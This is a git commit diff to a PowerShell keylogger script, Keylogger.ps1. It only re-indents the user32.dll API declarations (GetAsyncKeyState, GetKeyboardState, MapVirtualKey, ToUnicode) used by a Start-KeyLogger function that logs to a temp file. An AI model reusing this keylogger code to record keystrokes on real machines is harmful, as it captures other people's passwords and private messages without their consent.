babb423d0ed5558ad1dca5232771c43b43063292
caabv <41907756+caabv@users.noreply.github.com>
2019-04-02 15:10:50 +0200

    Update Keylogger.ps1
    Updated

--- Keylogger.ps1
+++ Keylogger.ps1
@@ -8,14 +8,14 @@ function Start-KeyLogger($Path="$env:temp\keylogger.txt")
 {
   # Signatures for API Calls
   $signatures = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-public static extern short GetAsyncKeyState(int virtualKeyCode); 
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int GetKeyboardState(byte[] keystate);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+		[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+		public static extern short GetAsyncKeyState(int virtualKeyCode); 
+		[DllImport("user32.dll", CharSet=CharSet.Auto)]
+		public static extern int GetKeyboardState(byte[] keystate);
+		[DllImport("user32.dll", CharSet=CharSet.Auto)]
+		public static extern int MapVirtualKey(uint uCode, int uMapType);
+		[DllImport("user32.dll", CharSet=CharSet.Auto)]
+		public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 '@
 
   # load signatures and make members available
